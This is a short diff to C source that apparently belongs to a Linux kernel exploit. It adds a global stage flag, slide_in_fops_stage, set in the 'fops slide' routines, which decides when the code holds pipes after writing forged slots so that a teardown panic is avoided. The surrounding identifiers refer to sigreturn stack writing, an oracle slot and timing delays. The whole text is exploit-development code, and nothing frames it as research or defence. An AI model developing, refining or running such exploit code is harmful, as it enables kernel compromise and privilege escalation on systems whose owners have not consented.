@@ -1,6 +1,8 @@
 #include "common.h"
 #include "g4hold.h"
 
+int slide_in_fops_stage = 0;
+
 #include <netinet/in.h>
 #if defined(SLIDE_STACK_WRITER) && \
     defined(SLIDE_STACK_WRITER_SIGRETURN) && \
@@ -2175,7 +2177,7 @@ static int slide_trigger_physical_state_report(int report_status) {
     disable_rseq_for_thread();
     slide_log_child_context();
     int _g4_ret = slide_child_trigger_write() ? 0 : 1;
-    if (_g4_ret == 0 && report_status == 0) {
+    if (_g4_ret == 0 && slide_in_fops_stage) {
       /* Success: forged slots exist. Hold pipes to prevent teardown panic. */
       g4hold_now();
     } else {
@@ -2324,6 +2326,7 @@ static int app_trigger_fops_slide_slot(size_t slot) {
 }
 
 int app_trigger_fops_slide_route(void) {
+  slide_in_fops_stage = 1;
 #if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
     APP_FOPS_REUSE_VERIFIED_PAGE
   return app_trigger_fops_slide_slot(P0_ORACLE_PRODUCTION_SLOT);
@@ -2341,6 +2344,7 @@ int app_trigger_fops_oracle_slot(size_t slot) {
 #endif
 #else
 int app_trigger_fops_slide_route(void) {
+  slide_in_fops_stage = 1;
   static size_t delay_index;
   static const int delays[] = {
     20000, 60000, 80000, 40000, 90000, 70000,
